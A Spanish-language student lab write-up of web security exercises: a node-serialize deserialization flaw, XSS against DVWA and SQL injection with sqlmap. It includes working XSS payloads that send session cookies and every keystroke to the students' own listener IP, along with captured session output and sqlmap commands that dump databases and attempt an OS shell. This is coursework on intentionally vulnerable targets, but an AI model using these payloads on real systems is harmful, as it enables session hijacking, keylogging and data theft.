##### Ej 2
Cuando entramos a la pagina pudimos ver una imagen que describia un sitio en construccion y ademas de eso el sitio setea una cookie profile.
Al principio pensamos que era un tipo de jwt pero finalmente descubrimos que esta encodeada en base64 y obteniendo los siguientes datos:

{"username":"Admin",
"csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":"Friday, 13 Oct 2018 00:00:00 GMT"}

Ademas, una vez seteada esta cookie el la pagina falla con un error 500 mostrando el siguiente mensaje:

        SyntaxError: Unexpected token F in JSON at position 79
            at JSON.parse (<anonymous>)
            at Object.exports.unserialize (/under/node_modules/node-serialize/lib/serialize.js:62:16)
            at /under/server.js:12:29
            at Layer.handle [as handle_request] (/under/node_modules/express/lib/router/layer.js:95:5)
            at next (/under/node_modules/express/lib/router/route.js:137:13)
            at Route.dispatch (/under/node_modules/express/lib/router/route.js:112:3)
            at Layer.handle [as handle_request] (/under/node_modules/express/lib/router/layer.js:95:5)
            at /under/node_modules/express/lib/router/index.js:281:22
            at Function.process_params (/under/node_modules/express/lib/router/index.js:335:12)
            at next (/under/node_modules/express/lib/router/index.js:275:10)

Viendo este mensaje notamos que el sitio web usa node.js y modulos de este para serializar datos, ademas podemos ver que probablemete el backend este diseñado con el framework express y por ende con el lenguaje javaScript y por ende datos en forma de Json

El siguiente paso fue ver que pasaba si modificabamos la cookie profile, usando burp cambiamos en la cookie el username por otro string

{"username":"Seguridad",
"csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":"Friday, 13 Oct 2018 00:00:00 GMT"}
y viendo que en la pagina se mostraba Hello Seguridad.

Buscando informacion sobre la siguiente linea 

        at Object.exports.unserialize (/under/node_modules/node-serialize/lib/serialize.js:62:16)
Y teniendo en la cabeza que podria tener algo que ver con un problema en cuanto a la serializacion encotramos este [link](https://blog.websecurify.com/2017/02/hacking-node-serialize.html)
Pensamos que se podia tratar de una vulnerabilidad en cuanto a la serializacion de node que nos permitiria ejecutar codigo remotamente.

Buscando como poder explotar esta vulnerabilidad encontramos el siguiente [link](https://mars-cheng.github.io/blog/2018/Vulnhub-Temple-of-Doom-1-Write-up/) con un paso a paso sobre como explotar un fallo de seguiridad muy similar al encontrado en esta pagina usando un reverse shell attack y asi es posible obtener permisos de root.


##### Ej 5 

Primero realizamos el ataque basico de robo de cookies de sesion en cada una de las rutas, tanto en dvwa/vulnerabilities/xss_r/ como en /dvwa/vulnerabilities/xss_s/
el ataque lo realizamos primero abriendo un servidor controlado por nosotros con el comando 
        
        python -m SimpleHTTPServer
y luego enviando el siguiente input 

        <script>var i = new Image; i.src = "http://192.168.0.70:8000/"+document.cookie ; </script>

la ruta http://192.168.0.70:8000/ es nuestra ip y el puerto 8000 es donde esta seteado el SimpleHTTPServer

obteniendo como salida:

192.168.0.59 - - [27/Sep/2020 18:31:44] code 404, message File not found
192.168.0.59 - - [27/Sep/2020 18:31:44] "GET /security=low;%20PHPSESSID=v5cco41lqjuufohli3o6v0cvl0;%20acopendivids=swingset,jotto,phpbb2,redmine;%20acgroupswithpersist=nada HTTP/1.1" 404 -

obteniendo asi las cookies de sesion.
en ambas rutas funciona igual con la diferencia de que en /dvwa/vulnerabilities/xss_s/ el comando queda guardado y luego se ejecuta cada vez que se ingresa a esa pestaña.

Finalmente para realizar un ataque que capture las teclas presionadas por un usuario, se nos ocurrio intentar crear un script que envie mediante un post las teclas presionadas y almacenar estas en un archivo .txt 
no encontre una menera facil de hacer un post con el modulo SimpleHTTPServer asi que decidi crear mi propio server.py el cual esta adjuntado. una vez creado el server diseñamos el script que es el siguiente:

        <script type="text/javascript">
                var l = "";        
                document.onkeypress = function (e) {
                        l += e.key;
                var req = new XMLHttpRequest();
                req.open("POST","<http://192.168.0.70:7900/>", true); 			
                req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                req.send("data=" + l);

                }
        </script>  
basicamente este script mediante  XMLHttpRequest nos envia un post con cada una de las teclas presiondas y las guarda en un archivo data.txt    
##### Ej 3
Para resolver este ejrcicio vimos a que direcciones hacia request la pagina web, y de esta forma vimos que la pagina pedia sus imagenes en la siguiente ruta /meme?id=

Investigando mas a fondo en esta ruta notamos que por ejeplo podiamos ingresar en la url cosas como /meme?id=1+AND+1=1 nos devuelve una imagen en base64 (es decir, contestaba nuestro request) lo mismo que hacer /meme?id=1 en cambio si hacemos /meme?id=1+AND+1=2 obtenemos un Not Found

Esto indicaba que probablemente la vulnerabilidad que existe en esta pagina web sea una sql injection.

Cuando supimos esto encontramos una herramienta llamada sqlmap la cual nos permitia explotar esta vulnerabilidad y asi poder ver la base de datos de la pagina.

Con el comando: 

        python sqlmap.py -u "http://143.0.100.198:5010/meme?id=1" --batch --dbs

pudimos ver que bases de datos contenia la pagina, obteniendo el siguiete output:

web application technology: Nginx 1.17.10
back-end DBMS: MySQL 5 (MariaDB fork)
available databases [4]:

[*] information_schema

[*] memes_db

[*] mysql

[*] performance_schema

luego con el siguiente comando

        python sqlmap.py -u "http://143.0.100.198:5010/meme?id=1" --batch --tables -D memes_db

vimos que la bd memes_db contiene las siguietes tablas
web application technology: Nginx 1.17.10
back-end DBMS: MySQL 5 (MariaDB fork)
Database: memes_db

[2 tables]

+--------+

| albums |

| memes  |

+--------+

con el comando: 

        python sqlmap.py -u "http://143.0.100.198:5010/meme?id=1" --batch --dump -T memes -D  memes_db

pudimos ver toda la info de la tabla memes.

Finalmente intentamos con el comando 

        python sqlmap.py -u "http://143.0.100.198:5010/meme?id=1" --batch --os-shell

para ver si podiamos conectarnos a la terminal del back-end pero no fue posible.

Finalmete sqlmap crea un archivo llamado log que almacena todo el output obtenido de las distintas corridas del programa. adjuntamos este archivo en la carpeta ej3 con el output obtenido de distintas ejecuciones. En este resumen incluimos todas las que nos devolvieron informacion util.





